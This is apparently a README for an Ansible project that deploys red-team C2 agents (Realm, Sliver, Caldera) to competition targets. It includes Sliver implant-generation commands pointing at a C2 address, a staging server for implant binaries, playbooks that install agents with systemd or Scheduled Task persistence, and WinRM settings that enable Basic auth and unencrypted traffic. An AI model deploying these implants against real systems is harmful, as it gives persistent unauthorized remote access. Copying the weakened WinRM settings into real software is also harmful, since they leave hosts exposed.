# Agent Deploy — Realm · Sliver · Caldera

Ansible project for deploying red-team C2 agents to competition targets in one command.

| Agent   | Transport | Linux persistence | Windows persistence |
|---------|-----------|-------------------|---------------------|
| Realm   | HTTP/S    | systemd service   | Scheduled Task      |
| Sliver  | mTLS      | systemd service   | Scheduled Task      |
| Caldera | HTTP      | systemd service   | Scheduled Task      |

**Supported targets:** Windows Server 2022 · Debian 13 · Ubuntu Desktop 24.04

---

## Quick Start

### 1 — Set target IPs

Edit `hosts.ini` — the only file you need to touch before deployment:

```ini
[windows]
winserv-01  ansible_host=<IP>

[debian]
debian-01   ansible_host=<IP>

[ubuntu]
ubuntu-01   ansible_host=<IP>
```

Add or remove lines per group as needed. Group aliases (`linux`, `all_targets`) are
automatically derived — do not edit them.

### 2 — Set credentials and C2 IPs

Edit `group_vars/all.yml`:

```yaml
deploy_user:     "administrator"   # same user for ALL targets
deploy_password: "Password123!"    # same password for ALL targets

staging_ip:   "192.168.1.5"        # HTTP server hosting Realm + Sliver binaries
caldera_c2_ip: "192.168.1.5"       # running Caldera server
sliver_c2_ip:  "192.168.1.5"       # Sliver C2
realm_c2_ip:   "192.168.1.5"       # Tavern C2
```

### 3 — Pre-generate Sliver implants  *(Sliver only)*

On your Sliver C2 server, generate implants and place them in your staging directory:

```
sliver> generate --mtls 192.168.1.5:8888 --os linux   --save /tmp/staging/sliver-implant-linux
sliver> generate --mtls 192.168.1.5:8888 --os windows --save /tmp/staging/sliver-implant.exe
```

Then start a staging HTTP server from that directory:

```bash
cd /tmp/staging
python3 -m http.server 9999
```

> Realm binaries (`imix-linux`, `imix.exe`) are also served from this same staging server.
> Caldera's Sandcat binary is pulled directly from the Caldera server — no staging required.

### 4 — Deploy

```bash
# Deploy ALL agents to ALL targets
ansible-playbook site.yml

# Deploy ALL agents per OS type (Windows / Debian / Ubuntu only)
ansible-playbook deploy-windows.yml
ansible-playbook deploy-debian.yml
ansible-playbook deploy-ubuntu.yml

# Deploy a single agent (all targets)
ansible-playbook deploy-realm.yml
ansible-playbook deploy-sliver.yml
ansible-playbook deploy-caldera.yml

# Deploy a single agent to one OS type
ansible-playbook deploy-sliver.yml --limit windows
ansible-playbook deploy-caldera.yml --limit linux

# Scope to one host
ansible-playbook site.yml --limit winserv-01
```

### Cleanup

```bash
# Remove all agents from all targets
ansible-playbook cleanup.yml

# Remove only Sliver from Windows
ansible-playbook cleanup.yml --limit windows --tags sliver

# Available tags: realm  sliver  caldera
```

---

## Directory Structure

```
agent-deploy/
├── hosts.ini               ← Edit target IPs here
├── group_vars/
│   ├── all.yml             ← Edit credentials + C2 IPs here
│   ├── windows.yml         ← WinRM connection (no edits needed)
│   └── linux.yml           ← SSH connection (no edits needed)
├── ansible.cfg
├── site.yml                ← Deploy all agents to all targets
├── deploy-windows.yml      ← All agents, Windows only
├── deploy-debian.yml       ← All agents, Debian only
├── deploy-ubuntu.yml       ← All agents, Ubuntu only
├── deploy-realm.yml
├── deploy-sliver.yml
├── deploy-caldera.yml
├── cleanup.yml
└── roles/
    ├── realm/
    │   ├── defaults/main.yml   ← Binary paths / service names
    │   └── tasks/
    │       ├── main.yml        ← OS dispatcher
    │       ├── linux.yml
    │       └── windows.yml
    ├── sliver/   (same layout)
    └── caldera/  (same layout)
```

---

## Requirements

```bash
pip install ansible pywinrm
ansible-galaxy collection install ansible.windows community.windows
```

Windows hosts must have WinRM enabled (port 5985). To enable on a target:

```powershell
winrm quickconfig -q
winrm set winrm/config/service/auth '@{Basic="true"}'
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
```
